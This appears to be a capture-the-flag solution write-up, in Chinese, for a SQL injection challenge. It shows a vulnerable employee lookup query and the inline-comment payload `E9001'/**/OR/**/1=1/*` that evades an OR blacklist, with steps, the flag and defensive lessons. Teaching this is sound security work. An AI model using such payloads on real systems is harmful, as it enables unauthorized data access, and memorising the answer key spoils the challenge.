# ✅ Web-45 解題說明 — 員工ID查詢 Inline Comment Bypass

## 題目描述
系統要求輸入員工id才可查詢員工資料。後端查詢邏輯：

```sql
SELECT employee_id, name, dept, title
FROM employees
WHERE authorized = 0 AND employee_id = '<user_input>'
;
```

若查不到資料，或輸入高權限員工但權限不足，頁面統一顯示：
`員工id錯誤或權限不足`

你的目標是利用 inline comment (`/**/`) 混淆條件，繞過限制並查出 `E9001`。

## 難度
★★★☆☆（3星）

## 種類
WEB, SQL Injection, Inline Comment Bypass

## 建議工具
- 瀏覽器
- DevTools
- SQL 語法與註解基礎

## 實際背景（貼近真實）
很多內部系統會提供「按員工編號查資料」功能，並嘗試用簡單黑名單封鎖 `OR`。
常見錯誤是只攔 `or` 這個字，但沒有處理 `/**/` 插入後的變形 token。

例如：
- 被攔：`' OR 1=1`
- 可能放行：`'/**/OR/**/1=1/*`

## 解題步驟
1. 先輸入 `E9001`，你會看到 `員工id錯誤或權限不足`（因為 `authorized = 0` 限制）。
2. 輸入 `E9001' --` 仍然不會成功，因為 `authorized = 0` 在前面，無法被尾端註解移除。
3. 觀察查詢預覽與條件結構，思考如何把 `OR` 混進字串並避開黑名單。
4. 使用 inline comment 包裝關鍵字，讓後端字串拼接後改變條件邏輯。
5. 成功查出 `E9001` 後，頁面會顯示旗標。

## 標準答案（Payload）
在輸入框填入：

```text
E9001'/**/OR/**/1=1/*
```

此 payload 會把查詢改寫為：

```sql
WHERE authorized = 0 AND employee_id = 'E9001'/**/OR/**/1=1/*' ORDER BY ...
```

`OR 1=1` 令條件為真，而 `/*` 會註解後續內容；結果集合會包含 `E9001`，頁面會優先顯示該筆高權限資料並拿到旗標。

## 驗證與常見卡點
- 驗證方式：結果區出現 `E9001` 的員工資料，並顯示 Flag。
- 常見卡點：payload 引號不平衡導致 SQL 語法錯誤。
- 常見卡點：只會用 `OR`（空白分隔），但沒有用 `/**/` 混淆，導致被黑名單擋下。
- 常見卡點：前綴員工id寫錯（例如 `E9002'/**/OR/**/1=1--`），系統只接受與請求員工id一致的結果，不會解鎖 `E9001`。
- 常見卡點：忽略 `AND` / `OR` 的優先順序，造成繞過失敗。

## 學習重點
- 黑名單防護非常脆弱，特別是 token 可被註解混淆時。
- `員工id錯誤或權限不足` 這種統一錯誤訊息雖可降低資訊洩漏，但不能取代安全查詢。
- 正確防禦仍是參數化查詢與權限分層，不是字串過濾。

## Flag
`flag{inline_comment_condition_bypass}`
